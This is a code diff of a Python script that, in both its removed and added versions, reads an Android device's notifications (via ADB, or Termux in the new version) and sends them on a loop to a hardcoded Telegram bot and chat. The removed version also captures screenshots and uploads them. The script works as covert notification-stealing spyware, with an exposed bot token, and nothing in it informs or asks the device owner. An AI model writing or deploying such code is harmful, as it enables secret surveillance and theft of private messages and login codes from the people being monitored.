@@ -1,52 +1,35 @@
 import subprocess
-import requests
 import time
+import requests
 
-# Telegram Bot Configuration
-TOKEN = "7762660744:AAHCxlWJvkwnI9ACKDX_zim2G8FEQa1_Drk"
+TELEGRAM_API_URL = "https://api.telegram.org/bot7762660744:AAHCxlWJvkwnI9ACKDX_zim2G8FEQa1_Drk/sendMessage"
 CHAT_ID = "5928551879"
 
-# Send Telegram Message
-def send_message(text):
-    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-    data = {"chat_id": CHAT_ID, "text": text}
-    response = requests.post(url, data=data)
+def send_telegram_message(message):
+    params = {
+        'chat_id': CHAT_ID,
+        'text': message
+    }
+    response = requests.get(TELEGRAM_API_URL, params=params)
     return response.json()
 
-# Send Telegram File
-def send_file(file_path, caption):
-    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
-    with open(file_path, "rb") as file:
-        response = requests.post(url, data={"chat_id": CHAT_ID, "caption": caption}, files={"document": file})
-    return response.json()
-
-# Fetch Notifications using ADB
-def fetch_notifications():
+def get_notifications():
     try:
-        result = subprocess.check_output(["adb", "shell", "dumpsys", "notification"]).decode("utf-8")
-        if result:
-            send_message(f"Notifications:\n{result[:4000]}")  # Limit to 4000 chars per message
-        else:
-            send_message("No notifications found.")
+        # Capture notifications using termux-notification-list
+        notifications = subprocess.check_output("termux-notification-list", shell=True, stderr=subprocess.PIPE)
+        notifications = notifications.decode('utf-8').strip()
+        return notifications
     except Exception as e:
-        send_message(f"Error fetching notifications: {e}")
+        print(f"Error fetching notifications: {e}")
+        return None
 
-# Capture Screenshot using ADB
-def capture_screenshot():
-    try:
-        file_path = "screenshot.png"
-        with open(file_path, "wb") as f:
-            subprocess.run(["adb", "exec-out", "screencap", "-p"], stdout=f)
-        send_file(file_path, "Screenshot captured")
-    except Exception as e:
-        send_message(f"Error capturing screenshot: {e}")
-
-# Main Loop
 def main():
     while True:
-        fetch_notifications()
-        capture_screenshot()
-        time.sleep(60)  # Run every 60 seconds
+        notifications = get_notifications()
+        if notifications:
+            # Send notifications to Telegram
+            send_telegram_message(f"Notifications:\n\n{notifications}")
+        time.sleep(10)  # Capture notifications every 10 seconds
 
 if __name__ == "__main__":
     main()
